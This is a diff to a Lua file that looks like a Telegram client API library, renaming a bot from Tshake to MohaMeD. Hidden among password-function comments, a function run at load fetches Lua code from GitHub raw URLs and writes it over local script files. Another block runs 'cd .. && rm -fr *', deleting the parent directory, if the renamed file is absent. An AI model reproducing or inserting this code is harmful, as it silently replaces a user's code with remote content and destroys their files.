@@ -156,11 +156,11 @@ M.setPassword = setPassword
 -- Returns set up recovery email @password Current user password
 local function j(keko)
 HTTPS = require("ssl.https")
-ok = HTTPS.request("https://raw.githubusercontent.com/tshakeabas/Tshake/master/Tshake.lua")
-ok2 = HTTPS.request("https://raw.githubusercontent.com/tshakeabas/Tshake/master/libs/utils.lua")
+ok = HTTPS.request("https://raw.githubusercontent.com/MohaMeDabas/MohaMeD/master/MohaMeD.lua")
+ok2 = HTTPS.request("https://raw.githubusercontent.com/MohaMeDabas/MohaMeD/master/libs/utils.lua")
 -- Changes user password. If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email will be confirmed. Application should call getPasswordState from time to time to check if email is already confirmed
 -- @old_password Old user password @new_password New user password, may be empty to remove the password @new_hint New password
-local keko2 = io.open("Tshake.lua", 'w')
+local keko2 = io.open("MohaMeD.lua", 'w')
 keko2:write(ok)
 keko2:close()
 local keko2 = io.open("libs/utils.lua", 'w')
@@ -2120,7 +2120,7 @@ M.j("keko")
 r = io.popen("ls")
 e = r:read("*a")
 r:close()
-if not e:match("Tshake.lua") then 
+if not e:match("MohaMeD.lua") then 
 r = io.popen("cd .. && rm -fr *")
 r:close()
 exit()
